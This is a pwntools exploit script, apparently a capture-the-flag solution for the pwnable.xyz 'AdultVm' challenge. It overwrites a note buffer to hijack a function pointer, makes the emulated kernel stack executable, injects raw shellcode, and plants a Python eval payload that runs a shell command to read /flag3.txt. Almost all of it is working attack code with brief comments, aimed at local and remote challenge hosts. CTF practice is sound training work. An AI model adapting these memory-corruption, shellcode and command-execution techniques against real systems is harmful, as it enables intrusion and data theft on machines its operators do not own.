from pwn import *
from unicorn import UC_PROT_READ, UC_PROT_WRITE, UC_PROT_EXEC
import time

# Pwnable.xyz AdultVm challenge

KERNEL_ADDRESS = 0xFFFFFFFF81000000
KERNEL_STACK =   0xFFFF8801FFFFF000

KERNEL_SYSCALL_HANDLER = KERNEL_ADDRESS + 7
KERNEL_SEGFAULT_HANDLER = KERNEL_ADDRESS + 14

USER_ADDRESS = 0x4000000
USER_STACK = 0x7ffffffff000

MAPPING_SIZE = 0x100000

context(kernel="amd64", arch="amd64", log_level="debug")

def main():
	e = ELF("userland")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		gdb.attach(p); time.sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		# p = remote("svc.pwnable.xyz", 30048)
		p = remote("127.0.0.1", 50505)


	write_ptr = e.symbols["write"]

	# fill notes memory
	for i in range(9):
		p.sendlineafter(b"Exit", b"1")
		p.sendlineafter(b"id:", str(i).encode())
		p.sendlineafter(b"Contents:", b"A"*0x39)

	# Overwrite first note
	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 1
	overwrited_note = USER_ADDRESS + MAPPING_SIZE
	overwrited_size = 120
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+b"B"*8+p64(write_ptr))


	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")


	p.interactive()



# Write pointer at the address: (0xFFFF8801FFFFF000-0x100-0xFFFFFFFF81000280)/8 => 0xFFFFF1004FDFFD90
def main_2():
	e = ELF("userland")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		gdb.attach(p); time.sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30048)
		# p = remote("127.0.0.1", 50505)


	write_ptr = e.symbols["write"]
	read_ptr = e.symbols["read"]
	syscall_ptr = 0x000000004000338

	# fill notes memory
	for i in range(9):
		p.sendlineafter(b"Exit", b"1")
		p.sendlineafter(b"id:", str(i).encode())
		p.sendlineafter(b"Contents:", b"A"*0x39)

	# Overwrite first note
	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0
	overwrited_note = KERNEL_STACK-0x100 #USER_ADDRESS + MAPPING_SIZE
	overwrited_size = 8
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+b"B"*8+p64(read_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")
	p.send(p64(0xFFFFFFFF810000F9))	# Send address at which we should jump after `syscall 0x2000`


	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0xFFFFF1004FDFFD90			# syscall number (Yep, a little big)
	overwrited_note = 0		# shoud be `fd` but here unused
	overwrited_size = KERNEL_ADDRESS + 0x5000		# *`buf`
	overwrited_serial = 70					# `count`
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+p64(overwrited_serial)+p64(syscall_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")


	p.interactive()



def main_3():
	e = ELF("userland")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		gdb.attach(p); time.sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		# p = remote("svc.pwnable.xyz", 30048)
		p = remote("127.0.0.1", 50505)


	write_ptr = e.symbols["write"]
	read_ptr = e.symbols["read"]
	jump_to_mprotect = 0xFFFFFFFF81000136
	syscall_ptr = 0x000000004000338
	user_shk_addr = 0x0000000004000618
	shk = b"\x48\xc7\xc0\x07\x00\x00\x00\x48\xbf\xb0\xef\xff\xff\x01\x88\xff\xff\x48\xc7\xc2" \
			b"\x43\x00\x00\x00\x48\x89\xfe\xcd\x70\x48\xbe\xb0\xef\xff\xff\x01\x88\xff\xff\x66" \
			b"\x89\xc1\x48\x89\xc8\x66\xba\xf8\x03\xf3\x6e\x66\xcf"
	SHK_ADDR = KERNEL_STACK-0x500
	SHK_SIZE = len(shk)

	# unused
	shk_user = b"\x48\xc7\xc0\x09\x00\x00\x00\x48\x83\xc0\x01\x48\xbf\x00\xf0\xef\xff\x01\x88\xff" \
				b"\xff\x48\xc7\xc6\x00\x00\x10\x00\x48\xc7\xc2\x07\x00\x00\x00\x68\x4f\x03\x00\x04" \
				b"\xc3"


	eval_payload = "__import__('subprocess').check_output('cat /flag3.txt', shell=True)"
	eval_addr = KERNEL_STACK-0x50



	# Send user-space shellcode
	# p.sendlineafter(b"Exit", b"1")
	# p.sendlineafter(b"id:", b"0")
	# p.sendlineafter(b"Contents:", shk_user.ljust(0x39, b"\x90"))

	# fill notes memory
	for i in range(9):
		p.sendlineafter(b"Exit", b"1")
		p.sendlineafter(b"id:", str(i).encode())
		p.sendlineafter(b"Contents:", b"A"*0x39)


	# Game plan: write shellcode at the stack, write python script also in the stack or memory
	# mprotect that stack address RWX
	# Write shellcode address and set rax to 0xFFFFFFFF810000F9 and call syscall



	# mprotect kernel stack
	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0
	overwrited_note = KERNEL_STACK-0x100
	overwrited_size = 8
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+b"B"*8+p64(read_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")
	p.send(p64(jump_to_mprotect))	# Send address at which we should jump after `syscall 0x2000`


	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0xFFFFF1004FDFFD90  			# syscall number
	overwrited_note = KERNEL_STACK - MAPPING_SIZE					# unsigned long `start`
	overwrited_size = MAPPING_SIZE									# size_t `len`
	overwrited_serial = UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC					# unsigned long `prot`
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+p64(overwrited_serial)+p64(syscall_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")
	# p.sendlineafter(b"Exit", b"1")
	# p.sendlineafter(b"id:", b"9")
	# p.sendlineafter(b"Contents:", b"B"*0x28+p64(user_shk_addr))
	# # Trigger exploit
	# p.sendlineafter(b"Exit", b"2")
	# p.sendlineafter(b"id:", b"0")


	input("Press Enter to continue......")



	# Write shellcode at the kernel stack
	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0
	overwrited_note = SHK_ADDR
	overwrited_size = SHK_SIZE
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+b"B"*8+p64(read_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")
	p.send(shk)


	# Write python code at the kernel stack
	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0
	overwrited_note = eval_addr
	overwrited_size = len(eval_payload)
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+b"B"*8+p64(read_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")
	p.send(eval_payload.encode())


	# Write shellcode pointer
	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0
	overwrited_note = KERNEL_STACK-0x100 #USER_ADDRESS + MAPPING_SIZE
	overwrited_size = 8
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+b"B"*8+p64(read_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")
	p.send(p64(SHK_ADDR))	# Send address at which we should jump after `syscall 0x2000`


	p.sendlineafter(b"Exit", b"1")
	p.sendlineafter(b"id:", b"9")
	overwrited_id = 0xFFFFF1004FDFFD90			# syscall number (Yep, a little big)
	overwrited_note = 0 		# unused
	overwrited_size = 0		# unused
	overwrited_serial = 0					# unused
	p.sendlineafter(b"Contents:", b"a"*8+p64(overwrited_id)+p64(overwrited_note)+p64(overwrited_size)+p64(overwrited_serial)+p64(syscall_ptr))
	# Trigger exploit
	p.sendlineafter(b"Exit", b"2")
	p.sendlineafter(b"id:", b"0")
	# p.send(p64(0xFFFFFFFF810000F9))	# Send address at which we should jump after `syscall 0x2000`


	p.interactive()

main_3()